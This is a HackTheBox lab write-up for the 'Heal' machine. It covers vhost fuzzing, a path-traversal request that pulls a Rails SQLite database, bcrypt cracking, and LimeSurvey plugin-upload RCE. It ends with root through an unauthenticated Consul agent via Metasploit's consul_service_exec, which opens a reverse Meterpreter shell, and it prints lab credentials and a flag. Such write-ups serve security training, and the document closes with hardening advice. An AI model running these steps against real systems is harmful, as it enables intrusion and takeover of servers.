---
title: "Heal"
date: 2024-12-14
type: docs
tags:
  - htb
  - linux
  - medium
  - vhost-fuzzing
  - rails
  - path-traversal
  - lfi
  - sqlite
  - bcrypt
  - hashcat
  - limesurvey
  - plugin-rce
  - password-reuse
  - consul
  - hashicorp
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 22.04), **Difficulty:** Medium, **Released:** 2024-12-14, **IP:** `10.10.11.46` , `heal.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. `heal.htb` (React front end) talks to `api.heal.htb` (Rails). A vhost sweep also finds `take-survey.heal.htb` (LimeSurvey) later. The resume export endpoint `GET /download?filename=` on the API is **path traversal**, so read `config/database.yml` then the SQLite DB.
2. The `users` table has a **bcrypt** hash. `hashcat -m 3200` cracks it to `147258369`. The same email and password log into the **LimeSurvey admin** at `take-survey.heal.htb/index.php/admin`.
3. LimeSurvey admin lets you install a **plugin** from a zip. Upload `config.xml` plus `shell.php`, get RCE as `www-data`.
4. `limesurvey/application/config/config.php` has the DB password `AdmiDi0_pA$$w0rd`, reused by the user **`ron`**. SSH in.
5. An internal **HashiCorp Consul** agent on `127.0.0.1:8500` has no ACLs. Register a service whose health check runs a command, and Consul executes it as **root**.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| LimeSurvey admin (cracked bcrypt) | `ralph@heal.htb : 147258369` |
| `ron` (LimeSurvey `config.php`) | `AdmiDi0_pA$$w0rd` |
| `user.txt` | `/home/ron/user.txt` |
| `root.txt` | `/root/root.txt` , `30ed1e88fd2c4832194f69f78a4cd33b` |

</div>

---

## Overview

Heal is a "follow the subdomains" box with four applications on one host, and the work is figuring out which one to attack and with what. The API path traversal is subtle because the vulnerable route needs an authenticated session and only shows up after you register and generate a resume PDF. The LimeSurvey step is a known and reliable admin to RCE via **plugin upload** (LimeSurvey has no signature check on plugin zips). The privesc is a great one to know: **HashiCorp Consul with default config has no authentication**, and its service definitions can carry a `script` health check, so anyone who can reach the agent API can run commands as whatever user Consul runs as, here root.

Related vhost fuzz boxes: [Analytics](/writeups/hackthebox/linux/easy/analytics/), [Titanic](/writeups/hackthebox/linux/easy/titanic/), [Stocker](/writeups/hackthebox/linux/easy/stocker/). Related Rails / path traversal: [Inject](/writeups/hackthebox/linux/easy/inject/), [Bagel](/writeups/hackthebox/linux/medium/bagel/). Related "internal service with no auth to root": [Bolt](/writeups/hackthebox/linux/medium/bolt/) (Passbolt is different), see [Monitored](/writeups/hackthebox/linux/medium/monitored/) and [PC](/writeups/hackthebox/linux/easy/pc/) for the tunnel pattern.

---

## Full Walkthrough

### Nmap scan

```console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
80/tcp open  http    nginx 1.18.0 (Ubuntu)   (X-Powered-By: Express)
```

### Vhost fuzzing

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -H "Host: FUZZ.heal.htb" -u http://heal.htb/ --fs 178
```

```console
api                     [Status: 200, Size: 12515, Words: 469, Lines: 91]
```

### Path traversal in the API resume export

there was nothing on the `api` subdomain, but after signing up I noticed I can generate a resume as a PDF, and the `download` parameter has LFI, so I can pull files off the box.

```http
GET /download?filename=../../config/database.yml HTTP/1.1
Host: api.heal.htb
Authorization: Bearer <token>
```

```yaml
default: &default
  adapter: sqlite3
development:
  <<: *default
  database: storage/development.sqlite3
production:
  <<: *default
  database: storage/development.sqlite3
```

<div class="callout callout-note">

**Rails, path traversal, and where the DB lives**

The export builds `send_file(File.join(RESUMES_DIR, params[:filename]))` with no `..` filtering, and `File.join` will happily walk out. Reading `config/database.yml` tells you the app uses **SQLite** and the file is `storage/development.sqlite3` (even in production, a common misconfiguration). Pull that file with the same traversal and open it locally with `sqlite3` to dump `users`.

</div>

```bash
sqlite3 development.sqlite3 'select email, password_digest from users'
```

I found credentials in the SQLite file and cracked the bcrypt hash with `hashcat`.

```console
$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
```

when I clicked "take a survey" it gave me another subdomain, `take-survey`, and I logged into LimeSurvey with the same credentials at `http://take-survey.heal.htb/index.php/admin`.

### LimeSurvey plugin RCE

After some research I found I can upload plugins. I made a `config.xml` from the LimeSurvey examples, wrote `shell.php`, zipped them, and uploaded.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<config>
    <metadata>
        <name>baphometpwn</name>
        <type>plugin</type>
        <version>5.0</version>
    </metadata>
    <compatibility><version>6.6.4</version></compatibility>
    <updaters disabled="disabled"></updaters>
</config>
```

<div class="callout callout-note">

**Why LimeSurvey plugin upload is RCE**

LimeSurvey installs plugins from an uploaded zip with **no signature or code review**. The `config.xml` just needs a `name`, `type` of `plugin`, and a `compatibility` version that matches the running LimeSurvey (check the footer, here 6.x). Any `.php` file in the zip is dropped under `upload/plugins/<name>/` which is web reachable, so browsing to `shell.php` runs it as `www-data`. This has been the LimeSurvey admin to RCE path for years (see EDB and multiple CVEs).

</div>

now we just start our shell and boom.

### www-data to ron

`linpeas` kept crashing as `www-data`. Reading `/var/www/limesurvey/application/config/config.php` gave the DB password `AdmiDi0_pA$$w0rd`. It failed for `ralph`, worked for **`ron`**. `linpeas` runs fine as `ron`.

The nginx config confirms the layout (`api.heal.htb` proxies to a Rails app on `127.0.0.1:3001`, `take-survey.heal.htb` is the LimeSurvey PHP app).

### Privilege Escalation, Consul unauthenticated exec

```bash
ssh -L 8500:localhost:8500 ron@heal.htb
```

Port `8500` is a **HashiCorp Consul** HTTP API (`Invalid URL path: ... ensure the path starts with '/v1/'`, redirect to `/ui/`).

<div class="callout callout-note">

**Consul service exec as root**

A Consul agent with the default config has **no ACL system enabled**, so any client that can reach `:8500` can `PUT /v1/agent/service/register` a new service. If the agent has `enable_script_checks` (or `enable_local_script_checks`) on, a service definition can include a health check of type `script` / `args`, and the agent runs that command on its schedule **as the user running the agent**, which is root here. Metasploit's `exploit/multi/misc/consul_service_exec` does exactly this: register a service, wait for the check to fire, clean up.

</div>

```console
msf6 exploit(multi/misc/consul_service_exec) > set rhosts 127.0.0.1
msf6 exploit(multi/misc/consul_service_exec) > set lhost tun0
msf6 exploit(multi/misc/consul_service_exec) > run
[*] Service 'sRlPeuRwOG' successfully created.
[*] Meterpreter session 1 opened
meterpreter > shell
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
30ed1e88fd2c4832194f69f78a4cd33b
```

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/ron/user.txt` |
| `root.txt` | `/root/root.txt` , `30ed1e88fd2c4832194f69f78a4cd33b` |

---

## Lessons and Takeaways

- **Fuzz every subdomain.** Heal has four apps and the vulnerable ones (`api`, `take-survey`) are not linked from the front page.
- **`send_file` / `File.join` with user input is path traversal** in Rails just like anywhere else. Use `Rails.root.join` with a fixed base and reject `..`.
- **Do not run the development SQLite database in production**, and keep `database.yml` unreadable by the app user where possible.
- **Patch LimeSurvey and restrict plugin install** to a break glass procedure. Treat "install plugin from zip" as remote code execution.
- **Enable Consul ACLs (`acl.default_policy = "deny"`)** and turn off `enable_script_checks`. An unauthenticated agent API is root on the host.
- **Unique passwords** between LimeSurvey, the DB, and the `ron` account.

---

## Related Writeups

- **Vhost / subdomain fuzzing:** [Analytics](/writeups/hackthebox/linux/easy/analytics/), [Titanic](/writeups/hackthebox/linux/easy/titanic/), [Stocker](/writeups/hackthebox/linux/easy/stocker/)
- **Path traversal to a DB file to a hash crack:** [Bagel](/writeups/hackthebox/linux/medium/bagel/), [Titanic](/writeups/hackthebox/linux/easy/titanic/), [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/)
- **Admin panel plugin/theme upload to RCE:** [Blocky](/writeups/hackthebox/linux/easy/blocky/), [Nexus](/writeups/hackthebox/linux/easy/nexus/), [Usage](/writeups/hackthebox/linux/easy/usage/)
- **Internal service, tunnel, exploit to root:** [Monitored](/writeups/hackthebox/linux/medium/monitored/), [PC](/writeups/hackthebox/linux/easy/pc/), [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/)

## References

- LimeSurvey RCE via plugin (EDB 49318) <https://www.exploit-db.com/exploits/49318>
- Consul remote command execution <https://www.hashicorp.com/blog/protecting-consul-from-rce-risk-in-specific-configurations>
- Metasploit consul_service_exec <https://www.rapid7.com/db/modules/exploit/multi/misc/consul_service_exec/>
- hashcat mode 3200 (bcrypt) <https://hashcat.net/wiki/doku.php?id=example_hashes>
